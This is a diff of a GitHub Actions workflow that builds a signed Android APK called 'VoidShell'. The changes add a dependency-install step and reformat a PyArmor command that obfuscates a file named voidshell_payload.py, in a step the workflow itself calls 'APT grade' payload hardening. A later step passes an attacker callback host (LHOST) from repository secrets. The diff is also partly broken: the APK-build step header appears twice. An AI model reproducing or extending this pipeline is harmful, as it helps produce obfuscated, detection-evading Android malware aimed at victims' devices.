@@ -31,13 +31,26 @@ jobs:
           echo "build_id=$(date +%Y%m%d-%H%M%S)-$(openssl rand -hex 3)" >> $GITHUB_OUTPUT
           echo "apk_name=VoidShell-${{ steps.vars.outputs.build_id }}.apk" >> $GITHUB_OUTPUT
 
+      - name: Install dependencies
+        run: |
+          python -m pip install --upgrade pip
+          pip install pyaxmlparser androguard requests
+
       - name: Obfuscate payload (PyArmor 9 – 2025 APT grade)
         run: |
           pip install -U pyarmor
-          pyarmor gen --output dist/obf --advanced 4 --enable rft,bcc voidshell_payload.py
+          mkdir -p dist/obf
+          pyarmor gen \
+            --output dist/obf \
+            --advanced 4 \
+            --enable rft \
+            --enable bcc \
+            voidshell_payload.py
           cp dist/obf/dist/voidshell_payload.py voidshell_payload.py
-          echo "Payload hardened with PyArmor 9 (advanced=4)"
-          
+          echo "Payload hardened with PyArmor 9 (advanced=4, rft+bcc enabled)"
+
+      - name: Build signed APK (using your builder script)
+        # ... rest unchanged
       - name: Build signed APK (using your builder script)
         env:
           LHOST: ${{ secrets.LHOST }}                 # set these in repo secrets
